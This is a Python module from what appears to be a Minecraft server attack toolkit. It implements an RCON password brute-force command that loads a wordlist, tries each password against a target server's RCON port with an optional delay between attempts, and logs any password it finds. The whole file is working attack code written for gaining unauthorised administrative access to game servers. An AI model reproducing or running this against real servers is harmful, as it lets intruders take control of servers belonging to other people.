import time

from mcrcon import MCRcon, MCRconException
from utils.sounds.play_sound import play_sound
from utils.banners.banner_messages import *
from utils.checks.check_encoding import check_encoding
from utils.color.text_color import paint
from utils.managers.language_manager import language_manager
from utils.gets.get_log_file import create_file
from utils.managers.logs_manager import LogsManager
from utils.managers.config_manager import config_manager
from utils.gets.get_spaces import get_spaces


def rconbrute_command(server, password_file, delay=None):
    """ 
    Performs a brute force attack against the 
    RCON of the specified server.
    
    Args:
        server (str): IP Address and RCON Port.
        password_file (str): Password file.
        delay (str): Optional delay for password entry.
    """

    attack_finished = False
    password_found = False
    password = ''

    # Create a file to save the logs.
    file = create_file('rcon')

    # Create a LogsManager object to write the logs to the file.
    logs = LogsManager('rcon', file)

    if delay is not None:
        if not delay.replace('.', '').isdigit():
            paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["invalidArguments"]["invalidDelay"]}')
            return
        
    try:
        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["rconbrute"]["preparingTheAttack"]}')
        time.sleep(1)

        with open(password_file, 'r', encoding=check_encoding(password_file)) as f:
            passwords = f.readlines()

        if len(passwords) == 0:
            paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["rconbrute"]["emptyFile"]}')
            return

        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["rconbrute"]["numberOfPasswords"].replace("[0]", password_file).replace("[1]", str(len(passwords)))}')
        time.sleep(1)

        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["commands"]["rconbrute"]["startingTheAttack"]}')
        time.sleep(1.5)

        logs.create(server, password_file)
        server = server.split(':')
        print('')

    except KeyboardInterrupt:
        paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{rcon_stopping}')
        return

    while True:
        try:
            if attack_finished:
                if password_found:
                    if config_manager.config['sounds']:
                        play_sound('sound1')

                    paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{rcon_pwd_found.replace("[0]", password)}')
                    logs.write('save_rcon_password', password)

                else:
                    if config_manager.config['sounds']:
                        play_sound('sound1')

                    paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{rcon_pwd_not_found}')
                    logs.write('save_rcon_password', 'Not found!')
                
                break

            for password in passwords:
                password = password.replace('\n', '')
                paint(f'{get_spaces()}{language_manager.language["prefix"]}{rcon_trying_password.replace("[0]", password)}')
                
                if delay is not None:
                    try:
                        time.sleep(int(delay))

                    except ValueError:
                        time.sleep(float(delay))

                try:
                    with MCRcon(server[0], password, int(server[1]), timeout=35) as mcr:
                        mcr.disconnect()

                    password_found = True
                    break
                
                except MCRconException:
                    continue

                except TimeoutError:
                    paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{rcon_timeout}')

                except ConnectionRefusedError:
                    paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{rcon_connection_refused}')

                except Exception as e:
                    paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{language_manager.language["banners"]["rconbrute"]["error"].replace("[0]", str(e))}')
                
                return

            attack_finished = True

        except KeyboardInterrupt:
            paint(f'\n{get_spaces()}{language_manager.language["prefix"]}{rcon_stopping}')
            return
